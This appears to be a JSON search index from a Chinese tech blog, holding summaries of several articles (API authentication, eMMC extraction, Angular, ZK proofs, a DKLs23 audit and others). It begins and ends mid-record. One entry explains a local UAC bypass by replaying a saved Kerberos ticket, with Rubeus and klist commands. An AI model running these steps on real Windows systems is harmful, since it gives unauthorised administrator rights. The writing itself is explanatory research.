HMAC加密\r采用对称加密验证数据载荷完整性 适用场景：客户端和服务端均由单方控制的场景 挑战：移动端密钥存储安全问题，特别是URL嵌入密钥时 OAuth 2.0（黄金标准）\r五大授权类型： 授权码模式 PKCE扩展 客户端凭证 设备码 刷新令牌 核心特性： 支持动态令牌刷新 通过scope概念实现精细权限控制 可结合JWT实现载荷完整性检查 OpenID Connect\r基于OAuth 2.0的开源认证协议 三大授权类型： 授权码模式 隐式模式 混合模式 特点：简化第三方应用的用户身份验证 新兴认证方案\r令牌认证（OTP/魔法链接）\rOTP：基于TOTP/HOTP算法生成临时密码 魔法链接：含时效性验证码的URL 优势：无需记忆密码 风险：依赖传输通道安全性 通行密钥（Passkeys）\r基于WebAuthn标准的无密码方案 双重验证机制： 设备本地认证（生物识别/PIN） 公私钥加密挑战 特点：抗钓鱼攻击，但存在设备依赖风险 方案选型建议\r方案 适用场景 注意事项 基础认证 低风险数据的访问控制 必须启用SSL/TLS API密钥 需识别消费方的场景 避免URL嵌入凭证 HMAC 数据完整性要求高的封闭系统 注意密钥存储安全 OAuth 2.0 企业级复杂应用 妥善管理对称密钥分发 OpenID Connect 需平衡安全与简易性的第三方集成 控制RP权限范围 最佳实践：\n始终通过SSL/TLS通道暴露API 避免在URL/查询字符串中传输敏感凭证 采用强化的密钥管理系统 实现自动化密钥轮换机制 ","date":"2025-08-02T00:39:08+08:00","permalink":"http://localhost:1313/p/rest-api%E8%AE%A4%E8%AF%81%E7%9A%845%E7%A7%8D%E5%9F%BA%E7%A1%80%E7%AD%96%E7%95%A5%E5%8F%8A%E5%85%B6%E6%BC%94%E8%BF%9B%E6%96%B9%E6%B3%95/","title":"REST API认证的5种基础策略及其演进方法"},{"content":"系统内提取嵌入式多媒体卡(eMMC)内容\r技术背景\r现代复杂设备需要非易失性存储来保存断电时的程序和配置数据。当前市场主流方案包括串行Flash、原始NAND芯片、(micro)SD卡和嵌入式多媒体卡(eMMC)。本文重点探讨eMMC芯片的系统内交互技术，避免物理移除芯片带来的风险。\n技术挑战与解决方案\r问题1：定位电路板上的eMMC信号\r信号特征：CLK(主机提供时钟)、CMD(双向命令线)、DAT0-DAT7(双向数据线) 定位方法： 检查PCB丝印标记 追踪芯片周围走线 使用逻辑分析仪捕捉上电时的信号特征 协议分析确认有效信号 问题2：eMMC芯片供电方案\r供电选择： 利用设备原有供电系统（需处理看门狗电路等问题） 外部独立供电（需电流限制保护） 电压要求： VDDQ决定总线信号电平（常见1.8V/3.3V） 需使用双向电平转换器（推荐TI TXS系列） 问题3：系统隔离技术\r抑制系统活动方法： 仅对eMMC独立供电 强制断言SoC复位信号 禁用主引导设备 干扰时钟源（如移除晶体振荡器） 实施注意事项\r信号完整性：保持接线最短 分区访问限制：常规接口可能无法访问boot/RPMB分区 后期分析：通过用户区获取系统访问权限后扩展研究 延伸阅读\r建议进一步研究侵入式技术方案。可通过Mastodon(@InfoSecDJ)联系作者获取更多技术细节。\n","date":"2025-08-02T00:02:01+08:00","permalink":"http://localhost:1313/p/%E7%B3%BB%E7%BB%9F%E5%86%85%E6%8F%90%E5%8F%96%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%A4%9A%E5%AA%92%E4%BD%93%E5%8D%A1emmc%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/","title":"系统内提取嵌入式多媒体卡(eMMC)内容的技术指南"},{"content":"Top 15 Angular面试问题与答案\r现代软件开发行业需要精通各种流行框架（特别是JavaScript）的技能型开发者。在所有流行的JavaScript框架中，Angular是当前市场上最受欢迎的平台之一。\nAngular体系庞大且难以全面掌握，因此基于该框架的面试问题可能颇具挑战性。本文将引导你了解基础到高级的Angular面试问题，助你备战Angular开发岗位。\nQ-1. 什么是Angular？\rAngular是由Google于2016年创建的开源免费JavaScript框架，通过HTML、CSS和JavaScript等技术帮助构建现代Web和移动应用。其核心编程语言是TypeScript，作为开源前端框架特别适合创建企业级应用，支持代码重用且易于维护。\nQ-2. Angular使用了哪些技术？\r作为开发者首选的JavaScript框架，Angular通过多种技术实现特定功能：\n使用TypeScript（JavaScript的超集） 基于组件化架构 采用依赖注入设计模式 Q-3. Angular有哪些优势？\rMVC架构：模型管理数据，视图处理展示，控制器作为桥梁 依赖注入：简化开发流程，实现任务分治 双向数据绑定：自动同步模型与视图，减少开发时间 自定义指令：通过DOM属性改变元素行为 RESTful服务支持：通过ngResource模块创建可扩展API 代码生成：工具自动生成元数据和可用代码 验证支持：自动运行验证并显示错误 模板支持：支持静态模板和Angular模板 CLI工具：通过命令行初始化和管理应用 动画等高级功能：简化复杂动画实现 Q-4. Angular的主要特性是什么？\r跨平台开发：支持Windows/Mac/Linux桌面应用和移动开发 代码分割：通过懒加载优化性能 动画支持：基于Web动画API实现复杂效果 CLI工具：自动化项目搭建和配置 声明式UI：使用HTML定义界面降低复杂度 无障碍支持：遵循ARIA标准 Material组件：提供现成的UI组件库 差异化加载：根据浏览器版本发送不同代码 高性能：懒加载机制提升运行效率 Q-5. Angular的核心基础是什么？\r组件：UI构建的基本单元 Angular元素：符合Web Components标准的组件 指令：扩展HTML元素行为的类 原生移动支持：通过Ionic等方案实现 模块：应用的逻辑组织单元(NgModules) 依赖注入：提升灵活性和模块化 模板：定义组件渲染方式的HTML 路由：实现视图导航 数据绑定：组件间数据共享机制 服务：可复用的业务逻辑单元 Q-6. 什么是数据绑定？\r数据绑定建立应用UI与业务数据的连接，包含四种类型：\n双向数据绑定 字符串插值 属性绑定 事件绑定 Q-7. 什么是DOM？\r文档对象模型(DOM)以树形结构表示页面内容，Angular指令可将应用数据绑定到DOM元素属性。\nQ-8. Angular与AngularJS的区别？\r参数 Angular AngularJS 架构 指令/组件 MVC 支持 持续更新 停止维护 速度 更快 较慢 移动支持 支持 不支持 语言 TypeScript JavaScript Q-9. 解释MVVM架构\r包含三个部分：\nModel：业务逻辑和数据 View：用户界面层 ViewModel：连接View和Model的抽象层 Q-10. 什么是指令？\r指令是通过属性扩展HTML行为的特性，分为：\n结构指令 属性指令 组件指令 Q-11. 什么是Angular CLI？\r命令行工具支持：\n项目初始化 组件生成 测试执行 依赖管理 Q-12. 解释依赖注入\r设计模式特点：\n类从外部获取依赖而非自行创建 提高灵活性和模块化 注入器负责解析和提供依赖 Q-13. 认证与授权如何实现？\r认证：验证用户凭证获取访问令牌 授权：基于令牌控制资源访问 Q-14. 什么是HTTP拦截器？\r示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 @Injectable() export class TokenInterceptor implements HttpInterceptor { intercept(request: HttpRequest\u0026lt;any\u0026gt;, next: HttpHandler) { const authToken = localStorage.getItem(\u0026#39;authToken\u0026#39;); if (authToken) { request = request.clone({ setHeaders: { Authorization: authToken } }); } return next.handle(request); } } Q-15. 什么是服务端渲染？\r解决大型应用加载慢的问题：\n服务端返回完整渲染页面 浏览器接管后续交互 提升首屏加载性能 掌握这些核心知识将助你在Angular面试中脱颖而出。除了技术问题，别忘了准备开发者所需的软技能。如有疑问，欢迎在评论区提出。\n","date":"2025-08-01T23:37:27+08:00","permalink":"http://localhost:1313/p/angular%E9%9D%A2%E8%AF%95%E5%BF%85%E5%A4%8715%E4%B8%AA%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E7%AD%94/","title":"Angular面试必备：15个常见问题与解答"},{"content":"以最复杂方式绕过UAC\r虽然我不常研究这个，但发现新的UAC绕过方法总是很有趣。在阅读Rubeus工具的功能时，我意识到可以滥用Kerberos协议绕过UAC——至少在域加入系统中可行。不清楚之前是否有人记录过这种方法，有篇帖子讨论过类似技术但需要从其他系统发起攻击，而本文将描述本地实现的方案。\n技术背景\r系统默认会通过LSASS过滤网络身份验证令牌，移除本地管理员的权限。但存在关键例外：如果用户是域用户兼本地管理员，LSASS会允许网络认证使用完整管理员令牌。这在通过Kerberos进行本地认证时会产生问题——难道这不是简单的UAC绕过吗？\n实际上Kerberos有专门机制阻止这种攻击。去年我阅读了微软工程师Steve Syfuhs关于Kerberos如何防止本地UAC绕过的文章。简而言之：当用户请求服务票据时，LSASS会在TGS-REQ请求中嵌入本地安全信息，这些信息会被编码到生成的票据中。当该票据用于本地系统认证时，Kerberos会提取这些信息进行验证。\n通过分析Kerberos票据，我们发现两个关键字段：\n1 2 3 4 5 6 7 \u0026lt;Authorization Data - KERB_AD_RESTRICTION_ENTRY\u0026gt; Flags : LimitedToken Integrity Level : Medium Machine ID : 6640665F... \u0026lt;Authorization Data - KERB_LOCAL\u0026gt; Security Context: 60CE03337E01000025FC763900000000 核心绕过机制\rLSASS通过LsaISetSupplementalTokenInfo函数处理这些字段，主要检查包括：\n比较票据中的MachineID与LSASS内存中的值 检查未公开的LSA网络令牌过滤标志 验证用户SID是否属于本地账户域 当满足以下任一条件时过滤将失效：\n用户SID不属于本地账户域 LocalAccountTokenFilterPolicy策略非零 系统是域控制器(NtProductLanManNt) 两种具体利用方法\r方法一：票据重用攻击\r获取本地系统的服务票据并保存 重启系统使LSASS重新初始化 重新加载旧票据，此时MachineID不匹配导致过滤失效 1 2 3 4 PS\u0026gt; klist get RPC/$env:COMPUTERNAME PS\u0026gt; Rubeus.exe /dump /server:$env:COMPUTERNAME /nowrap # 保存Base64票据后重启 PS\u0026gt; Rubeus.exe ptt /ticket:\u0026lt;BASE64 TICKET\u0026gt; 方法二：票据伪造攻击\r利用Benjamin Delpy在kekeo中发现的非约束委派漏洞获取本地TGT 向KDC请求新的本地服务票据，填充伪造的MachineID 将伪造票据导入缓存实现UAC绕过 KERB-LOCAL的奥秘\r这个字段设计用于凭证重用，但实际使用频率很低，因为：\n仅当服务端使用Negotiate包时有效 本地Negotiate认证默认会选择NTLM协议 有趣的是，KERB-LOCAL中的值实际是LSASS堆中KERB_CREDENTIAL结构的地址和票据计数。虽然Kerberos会验证PAC中的SID匹配性，但这种实现方式可能存在安全隐患。\n[更新] 文末提供了修改Win32 SCM API以强制使用Kerberos本地认证的C++代码示例。\n","date":"2025-08-01T23:30:05+08:00","permalink":"http://localhost:1313/p/%E4%BB%A5%E6%9C%80%E5%A4%8D%E6%9D%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87uackerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/","title":"以最复杂方式绕过UAC：Kerberos协议漏洞利用详解"},{"content":"行为互联网(IoB)核心技术解析与应用前景\rIoB技术定义\rIoB(行为互联网)概念由赫尔辛基大学心理学教授Göte Nyman于2012年提出，是物联网(IoT)技术的延伸发展。其核心技术架构包含三个关键组件：\n数据采集层：通过IoT设备、可穿戴设备、社交平台等多源渠道获取用户行为数据 分析引擎：运用行为心理学模型和机器学习算法解析数据模式 应用接口：将分析结果转化为可操作的商业智能或个性化服务 核心技术实现\r设备编址体系：为每个行为分配唯一标识符(类似IP地址)，实现多源数据关联 实时处理框架：支持流式数据处理和行为预测模型更新 跨域数据融合：整合生物特征数据(心率/步数)、消费记录、社交互动等多模态信息 行业应用案例\r保险科技\r驾驶行为分析SDK集成到车载系统 事故场景重建算法(基于加速度计/GPS数据) 动态保费定价模型 数字营销\r用户兴趣图谱构建技术 实时推荐引擎架构 上下文广告投放系统(如Google Ads的IoB实现) 医疗健康\r可穿戴设备数据聚合平台 术后康复监测算法 用药依从性分析模型 技术挑战\r隐私保护：差分隐私、联邦学习等数据脱敏技术 安全防护：端到端加密传输、行为数据防篡改机制 系统集成：异构设备协议转换中间件开发 开发者技能栈\r核心语言：Python(数据分析)、JavaScript(前端可视化) 专业领域：传感器开发、行为模式识别算法 工具链：Apache Kafka(实时流处理)、TensorFlow(行为预测模型) Gartner预测到2025年全球过半人口将至少与1个IoB系统交互。该领域需要大量具备物联网架构设计、行为数据分析能力的复合型技术人才。\n","date":"2025-08-01T23:22:50+08:00","permalink":"http://localhost:1313/p/%E8%A1%8C%E4%B8%BA%E4%BA%92%E8%81%94%E7%BD%91iob%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E5%89%8D%E6%99%AF/","title":"行为互联网(IoB)核心技术解析与应用前景"},{"content":"用零知识证明重塑漏洞披露机制\r我们与约翰霍普金斯大学的合作伙伴Matthew Green正在利用零知识证明（ZK）技术建立一个可信环境，使科技公司与漏洞研究者能够安全沟通而不必担心破坏或纠纷。这项为期四年的研究将推动ZK证明从理论走向实践，为研究者提供能生成漏洞可利用性ZK证明的软件工具。该研究隶属于DARPA\u0026quot;加密验证与评估信息保护\u0026quot;（SIEVE）计划。\n为什么需要漏洞可利用性的ZK证明？\r软件厂商与漏洞研究者之间常因漏洞报告产生矛盾。研究者过度披露漏洞细节可能丧失奖励，而过早披露则可能损害企业声誉。更严重的是，当企业忽视安全团队警告时，研究者面临两难选择：保持沉默让用户处于风险，或公开漏洞迫使企业行动——后者可能反而帮助攻击者。\nZK证明将彻底改变这种局面，允许企业明确定义漏洞赏金范围，研究者则能无可辩驳地证明其拥有有效漏洞利用方案，同时避免公开披露风险。\nZK证明的设计原理\r在ZK证明中，证明者无需透露具体信息即可验证陈述真实性。例如证明知道SHA256原像而不泄露原像本身。目前最著名的工业应用是Zcash等隐私区块链，用户通过ZK证明交易合法性而不暴露任何敏感信息。\n开发高效ZK系统需权衡三个指标：\n证明生成时间 验证时间 通信带宽（证明数据量） 核心挑战在于将待证明陈述转换为无循环的布尔/算术电路。这对缺乏明确数学表述的问题尤为困难，例如包含数据依赖循环的程序必须展开处理。\n漏洞可利用性证明技术实现\r由于ZK证明接受布尔电路表述，我们需要构建仅在漏洞利用成功时返回\u0026quot;真\u0026quot;的电路。关键挑战包括：\n处理器建模：需精确模拟目标程序的编译架构。初始方案是对处理器单步运行建模，但会导致电路规模爆炸（50MB内存的100条指令轨迹将产生5GB电路）。\n内存验证优化：采用SNARKs for C的方案，将证明分为核心逻辑与内存正确性两部分。逻辑验证通过检查指令序列状态转移实现，内存验证则通过内存排序轨迹的线性扫描完成，避免直接处理整个RAM。\n防伪造机制：通过\u0026quot;置换检查器\u0026quot;电路确保内存排序轨迹的真实性。\nx86架构的特殊挑战\r从简易的MSP430 RISC架构转向复杂x86架构面临巨大挑战：\nRISC处理器每周期约1-10k逻辑门 基础x86模型处理10,000条指令可能产生48GB证明数据 我们的解决方案是：\n动态子集生成：通过程序分析确定二进制文件实际使用的x86指令子集（通常仅数百条） 静态二进制转换：对repz等运行时依赖指令，转换为可验证的子集指令 组合电路优化：避免硬编码复杂指令处理逻辑 漏洞披露新范式\r这项技术将实现：\n企业精确定义漏洞赏金范围 研究者安全提交漏洞证明 消费者保护机制：研究者可警示风险而不公开漏洞细节 我们正推动ZK证明从学术走向工业应用。如果您有特殊应用场景，欢迎联系我们——我们在ZK证明方案和电路编译器领域拥有丰富经验。\n（原文包含技术架构图表示例和论文引用，此处保留技术要点翻译）\n","date":"2025-08-01T23:16:03+08:00","permalink":"http://localhost:1313/p/%E7%94%A8%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E9%87%8D%E5%A1%91%E6%BC%8F%E6%B4%9E%E6%8A%AB%E9%9C%B2%E6%9C%BA%E5%88%B6-%E7%AA%81%E7%A0%B4%E6%80%A7%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"用零知识证明重塑漏洞披露机制 - 突破性技术解析"},{"content":"利用Amazon Cognito为AI代理赋予用户上下文权限\rAmazon Cognito是一项托管的客户身份和访问管理（CIAM）服务，可为Web和移动应用程序提供无缝的用户注册和登录功能。通过用户池，Amazon Cognito提供了具有强大身份验证功能的用户目录，包括密码、与外部身份提供商（IdP）的联合以及用于安全机器对机器（M2M）授权的OAuth 2.0流。\nAmazon Cognito颁发标准的JSON Web令牌（JWT），并支持使用预令牌生成Lambda触发器自定义身份和访问令牌以进行用户身份验证。Amazon Cognito扩展了令牌定制功能，支持M2M的访问令牌定制以及在M2M授权期间从客户端传递元数据的能力。应用程序构建者可以利用这两个功能来支持多种用例，包括基于唯一运行时策略、权限、环境或传递的元数据定制访问令牌。这可以简化和丰富M2M身份验证和授权场景，并为新兴用例（如AI代理的身份和访问管理）开辟新的可能性。\n解决方案概述和参考架构\r在一个示例架构中（图1），用户通过Amazon Cognito用户池登录到Web或移动应用程序，并将令牌返回给客户端。在这里，应用程序可以是一个使用Amazon Bedrock代理的无服务器数字助手，需要收集和处理驻留在第三方跨域服务中的数据。AI代理通过执行OAuth 2.0客户端凭证授权来获取自己的访问令牌，同时使用aws_client_metadata请求参数传递用户的访问令牌作为上下文。AI代理接收用户上下文化的访问令牌，并调用一个信任Amazon Cognito用户池颁发者与受众的外部、第三方或跨域服务。跨域服务可以获取JSON Web密钥集（JWKS）以验证令牌并提取表示AI代理和底层用户的声明。授权在跨域服务中使用定制访问令牌的声明进行，对于细粒度授权，使用Amazon Verified Permissions。\n实现细节\rAI代理获取OAuth 2.0访问令牌\nAI代理使用Amazon Bedrock代理，配置为使用Lambda的自定义编排。当应用程序与Amazon Bedrock代理交互时，自定义编排器将用户的访问令牌传递给Lambda函数作为自定义编排的一部分。Lambda函数验证用户的令牌以确保其未过期且未被篡改。\nAmazon Cognito预令牌生成Lambda触发器\n在AI代理使用有效的客户端ID和密钥调用Amazon Cognito的/token端点后，Cognito调用预令牌生成Lambda触发器。Lambda函数验证用户的访问令牌，并定制返回给AI代理的访问令牌。\n跨域资源服务器授权检查\n跨域服务作为资源服务器需要执行授权检查。使用aws-jwt-verify库验证AI代理的访问令牌的有效性。对于细粒度授权，可以使用Amazon Verified Permissions的IsAuthorizedWithToken API。\n结论\rAmazon Cognito的M2M访问令牌定制和支持传递客户端元数据的功能为您提供了解决复杂用例的扩展能力，并支持如AI代理身份和访问管理等新兴用例。随着组织越来越多地探索AI代理的使用，拥有一个安全、可扩展的身份管理解决方案对于保持控制和问责制变得至关重要。通过使用这些新功能，您可以构建更安全和可扩展的解决方案，为自主AI代理用例的未来做好准备。\n","date":"2025-08-01T23:09:07+08:00","image":"https://i.imgs.ovh/2025/08/01/HNnbm.png","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8amazon-cognito%E4%B8%BAai%E4%BB%A3%E7%90%86%E8%B5%8B%E4%BA%88%E7%94%A8%E6%88%B7%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9D%83%E9%99%90%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"利用Amazon Cognito为AI代理赋予用户上下文权限的技术解析"},{"content":"2024年2月13日（美国时间），微软发布了针对其产品安全漏洞的月度更新。本次更新涉及Windows、Exchange Server、Office等多款产品，共修复73个漏洞，其中5个漏洞在更新发布前已被公开利用，3个漏洞CVSS评分高达9.8分。\n关键漏洞警示\r以下漏洞需优先处理：\nCVE-2024-21351：Windows SmartScreen安全功能绕过漏洞 CVE-2024-21412：互联网快捷方式文件安全功能绕过漏洞 CVE-2024-21410：Exchange Server权限提升漏洞（CVSS 9.8） 高危漏洞\rCVE-2024-21413：Outlook远程代码执行漏洞 CVE-2024-21401：Microsoft Entra Jira单点登录插件权限提升漏洞 重要更新说明\rExchange Server：安装CU14后默认启用扩展保护功能\n安全启动：新增UEFI CA信任锚点，4月开始分阶段部署\n受影响产品清单\r产品系列 最高严重等级 主要影响 KB编号/链接 Windows 11/10 紧急 远程代码执行 5034765/5034763 Exchange Server 紧急 权限提升 更新指南 .NET Framework 重要 服务拒绝 详情 更新建议\r企业用户应立即评估Exchange Server漏洞风险 启用自动更新或通过安全更新指南手动下载 关注ADV990001获取服务堆栈更新 下次安全更新计划于2024年3月12日发布。建议通过安全更新指南API建立定制化监控方案。\n","date":"2025-08-01T23:01:47+08:00","permalink":"http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2024%E5%B9%B42%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E4%BF%AE%E5%A4%8D%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/","title":"微软2024年2月安全更新：修复多款产品高危漏洞"},{"content":"我们如何审查首批DKLs23库之一——来自Silence Laboratories的Silent Shard\r2023年10月，我们审计了Silence Laboratories基于DKLs23阈值签名方案(TSS)的库Silent Shard——这是当时首个采用茫然传输(OT)替代传统Paillier密码学的生产级实现。我们的审查发现了可能导致密钥销毁攻击的严重缺陷，Silence Laboratories已及时修复。\n审计三大核心发现\r协议实现的自由度：DKLs23规范赋予实现者选择子协议（基础OT、OT扩展、成对乘法）的极大自由度，需同时研究规范文档和具体实现选择 OT系统的优势：基于OT的系统通常比Paillier系统更不易出错，只需防范选择性中止攻击就能简化安全验证 TSS基础要素：所有TSS方案都需要关注安全P2P通信、广播和共识验证等基础机制 创新库Silent Shard\rSilence Laboratories由学术和工业界科学家组成，其开发的Silent Shard库支持包括MetaMask加密货币钱包在内的多种应用场景。该库基于创新的DKLs23协议构建，采用茫然传输(OT)而非Paillier加密系统来实现ECDSA签名，这种OT方案因其性能优势和Paillier系统的脆弱性（如BitForge和TSShock漏洞）近年备受关注。\n审计方法论\r文档审查：人工审查技术文档并与开发团队定期沟通 自动化分析： 使用cargo-audit检查依赖漏洞 通过Clippy识别Rust常见错误 采用cargo-llvm-cov分析测试覆盖率 运用定制工具Dylint检测代码质量问题 关键安全发现\r高危漏洞\rTOB-SILA-6：通信通道nonce复用问题\n可能允许恶意方篡改协议消息导致密钥销毁攻击。修复方案：为通道双向通信使用不同密钥。\nTOB-SILA-12：选择性中止攻击处理缺陷\n错误处理导致程序panic，无法正确识别恶意方。修复方案：明确返回包含被禁方ID的AbortProtocolAndBanReceiver错误。\n侧信道分析\r代码库通过subtle等crate实现恒定时间操作，有效防御了大多数侧信道攻击。仅在eval_pprf函数中发现存在时序信息泄露风险（实际攻击难度较高）。Silence Laboratories已提交补丁消除该泄漏。\n长期建议\r完善文档：特别是关于错误处理的文档，这对TSS系统至关重要 增强负面测试：可提前发现如TOB-SILA-1/2等问题，覆盖率分析也证实该需求 审计结束后，Silence Laboratories已修复14/15的安全问题，并持续改进文档和测试体系。\n关于TSS协议安全\r我们的密码学团队现已完成对ECDSA、Schnorr和BLS等所有主流TSS协议的安全评估，并为相关签名方案提供Go/Rust实现服务。如需TSS协议安全审查或工程实现，欢迎联系我们获取免费咨询服务。\n","date":"2025-08-01T22:54:49+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90silent-shard-dkls23%E9%98%88%E5%80%BC%E7%AD%BE%E5%90%8D%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E5%8F%91%E7%8E%B0/","title":"深度解析Silent Shard DKLs23阈值签名库的安全审计发现"},{"content":"加密货币劫持的技术实现\r随着比特币价值暴涨，网络安全专家警告称加密货币劫持攻击可能将用户设备变为非法挖矿工具。该技术通过未经授权在网站访问者浏览器中运行加密货币挖矿脚本实现：\n无恶意软件入侵：攻击者将Coinhive等挖矿脚本植入网站，当用户访问时自动加载JavaScript 资源劫持机制：脚本会消耗用户设备的CPU算力和电能进行加密货币挖掘 隐蔽性特征：当前主要针对门罗币（Monero）进行挖掘，相比比特币更不易被察觉 攻击规模实证数据\r移动安全厂商Wandera分析10万+移动设备发现：29%的企业至少有一台智能设备运行门罗币挖矿脚本 独立研究员Willem de Groot发现：2,500个热门网站存在加密货币劫持脚本 技术演变关键问题\r比特币价值飙升会否导致针对比特币的劫持攻击增加？ 鉴于挖矿对计算资源的高消耗，攻击者会否开发新型系统入侵手段？ 终端用户应采取哪些技术防护措施？ 本文源自TechTarget《Risk \u0026amp; Repeat》播客的技术讨论，完整分析包含浏览器脚本注入、资源监控防御等专业技术细节。\n","date":"2025-08-01T22:47:25+08:00","permalink":"http://localhost:1313/p/%E6%AF%94%E7%89%B9%E5%B8%81%E7%83%AD%E6%BD%AE%E4%B8%8B%E7%9A%84%E9%9A%90%E7%A7%98%E5%A8%81%E8%83%81%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/","title":"比特币热潮下的隐秘威胁：加密货币劫持技术剖析"},{"content":"JetBrains宣布更新其编码助手Junie\rJunie现已完全集成到GitHub中，支持异步开发功能，包括：同时委派多个任务、无需打开IDE即可快速修复问题、直接在GitHub中进行团队协作，以及无缝切换IDE和GitHub。GitHub版Junie目前处于早期访问计划，仅支持JVM和PHP。\nJetBrains还新增了对MCP的支持，使Junie能连接外部数据源。其他新特性包括任务完成速度提升30%，以及支持macOS和Linux的远程开发。\nGemini API推出首个嵌入模型\r这类模型可为单词、短语、句子和代码生成嵌入向量，提供比关键词搜索更精准的上下文感知结果。\u0026ldquo;它们能高效地从知识库中检索相关信息（以嵌入向量表示），并作为附加上下文输入语言模型，引导生成更明智和准确的响应。\u0026ldquo;Gemini文档说明。\n该嵌入模型支持100多种语言和2048个输入token长度，将通过免费和付费双层级开放，方便开发者免费实验后按需扩展。\nAmazon为SageMaker新增功能\r用户现可直接从SageMaker Unified Studio启动Amazon QuickSight，利用项目数据构建仪表板并分享至Amazon SageMaker Catalog供组织内成员发现。\n新增支持Amazon S3通用存储桶（便于查找和协作数据）及S3 Access Grants（实现细粒度访问控制）。用户还可将AWS Glue Data Catalog数据集导入SageMaker目录。\n\u0026ldquo;这些新功能在统一治理框架下覆盖完整数据生命周期：自动接入湖仓中的结构化数据、无缝编目Amazon S3的非结构化内容、通过QuickSight简化可视化流程。\u0026ldquo;AWS在博客中写道。\n","date":"2025-08-01T22:40:34+08:00","permalink":"http://localhost:1313/p/jetbrains%E5%8D%87%E7%BA%A7junie%E7%BC%96%E7%A0%81%E5%8A%A9%E6%89%8Bgemini-api%E6%96%B0%E5%A2%9E%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B%E7%AD%89%E6%8A%80%E6%9C%AF%E5%8A%A8%E6%80%81/","title":"JetBrains升级Junie编码助手、Gemini API新增嵌入模型等技术动态"},{"content":"程序员最佳桌面配置（终极指南）\r作者：John Sonmez\n一个专业、高效且美观的工作环境无疑能让你成为更高效、更快乐的程序员。那么实现这一目标需要考虑哪些因素？\n人体工学设计 屏幕尺寸与布局 硬件质量 必要配件 视觉氛围 让我们深入探索最佳程序员桌面配置方案，为改造现有空间或从零打造完美编程洞穴提供灵感：\n程序员桌面第一法则——选择合适的显示器\r编程显示器是工作台的核心部件，需谨慎选择。目标是在获得充足屏幕空间的同时，避免因尺寸过大导致颈部疲劳。无论是双屏/三屏、横竖组合、平面/曲面、16:9或超宽屏，都要确保能显示所有编程所需应用且不过分庞大。\n建议寻找视觉表现与工作效率的最佳平衡点。若想深入了解理想编程显示器配置，可参考我们关于该主题的专题文章。\n推荐编程显示器：Dell Ultrasharp 27英寸QHD⤻ͣ\n编程工作台本体\r升降桌⤻ͣ\n久坐显然有害健康，而程序员每天都要长时间坐着工作。站立稍好但也不宜过久，最佳方案是交替使用。电动（或手摇）升降桌能快速切换姿势，满足身体对姿态变化的需求。\n防疲劳脚垫⤻ͣ\n站立工作时，让双脚体验专为久站设计的脚垫\u0026quot;微地形\u0026quot;，可防止足部僵硬和功能退化。\n硬件配置选择\r台式机还是笔记本？\n优先选择性能更强、性价比更高且易升级的台式机。如需频繁移动办公，则选择笔记本。\n设备美化方案\n笔记本扩展坞⤻ͣ（合盖使用时更简洁） 机箱RGB灯效⤻ͣ（提升视觉冲击力） 桌面形态与布局\r直桌vs转角桌\n转角桌虽能放置打印机等设备，但并非编程桌必需品，且可能影响整体简洁感。\n凹形桌的人体工学优势\n凹形设计提供更沉浸的编程体验，给予前臂更多支撑空间（适用于未使用键盘托的情况，后文将详述）。\n笔记本支架⤻ͣ\n保持屏幕与视线平齐，避免头部前倾导致的颈部损伤。作为主屏或副屏使用时都需专用支架支撑。\n显示器支架⤻ͣ\r特别是双屏用户，使用多自由度支架能快速调整屏幕位置，其稳定性和灵活性远超原装底座。\n背光系统⤻ͣ\r合适的灯光既能营造编程氛围，又能缓解视觉疲劳。自定义色彩方案还能提升视频会议/录制时的形象表现。\n键盘托⤻ͣ\r程序员常见的斜方肌紧张问题，多源于键盘鼠标位置过高迫使手臂上抬。安装键盘托使手臂呈水平或微下垂状态，可显著降低肩部负荷。\n机械式人体工学分体键盘⤻ͣ\r传统键盘导致肩部内旋加剧不适，分体设计让双肩保持自然姿态，长期使用改善显著。\n腕托⤻ͣ\r桌面直接使用键盘会导致手腕持续背伸，增加腕管综合征风险。软质腕托能维持手腕中立位。\n可编程多键鼠标⤻ͣ\r为常用命令/窗口管理操作分配快捷键，可大幅提升编程效率。\n超大桌垫⤻ͣ\r提供舒适的鼠标操作区、前臂休息区及键盘防滑面，同时提升桌面整体美感。\n程序员必备高清摄像头⤻ͣ\r现代编程工作离不开视频沟通，高质量摄像头既满足远程协作需求，也适合内容创作。\nKVM切换器⤻ͣ\r多设备用户可通过单一键鼠显示器控制所有主机，提升工作效率。\n降噪耳机⤻ͣ\r隔绝干扰专注编程，旅行时也能创造安静环境。\n专业座椅⤻ͣ\r优质人体工学椅虽需一定投资，但能有效预防腰背疾病，延长职业寿命。\n脚踏板⤻ͣ\r促进腿部血液循环，缓解久坐导致的肌肉紧张和水肿问题。\n音响系统⤻ͣ\r为不戴耳机的场景或多人协作提供音效支持。\n线材管理⤻ͣ\r整洁的布线系统提升视觉清爽度，帮助集中注意力。\n绿植装饰⤻ͣ\r净化空气的同时增添生机。\n艺术陈设⤻ͣ\r根据个人风格选择墙面装饰，完善工作空间个性表达。\n主题摆件